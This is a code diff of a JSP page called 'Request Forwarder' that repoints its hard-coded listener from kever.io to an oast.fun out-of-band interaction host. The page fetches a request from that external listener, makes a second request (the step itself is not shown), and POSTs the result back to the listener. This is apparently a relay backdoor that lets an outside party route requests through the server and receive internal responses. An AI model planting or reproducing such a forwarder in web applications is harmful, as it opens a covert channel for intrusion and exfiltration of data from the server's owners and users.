@@ -8,8 +8,8 @@
     <h1>Request Forwarder</h1>
     <%
         try {
-            // Step 1: Make GET request to https://kever.io/jspListen.php
-            URL url1 = new URL("https://kever.io/jspListen.php");
+            // Step 1: Make GET request to https://dgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun/jspListen.php
+            URL url1 = new URL("https://dgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun/jspListen.php");
             HttpURLConnection connection1 = (HttpURLConnection) url1.openConnection();
             connection1.setRequestMethod("GET");
             BufferedReader in1 = new BufferedReader(new InputStreamReader(connection1.getInputStream()));
@@ -25,8 +25,8 @@
             String secondResponse = in2.lines().collect(Collectors.joining());
             in2.close();
 
-            // Step 3: POST the result of the second request back to https://kever.io/jspListen.php
-            URL url3 = new URL("https://kever.io/jspListen.php");
+            // Step 3: POST the result of the second request back to https://dgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun/jspListen.php
+            URL url3 = new URL("https://dgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun/jspListen.php");
             HttpURLConnection connection3 = (HttpURLConnection) url3.openConnection();
             connection3.setRequestMethod("POST");
             connection3.setDoOutput(true);
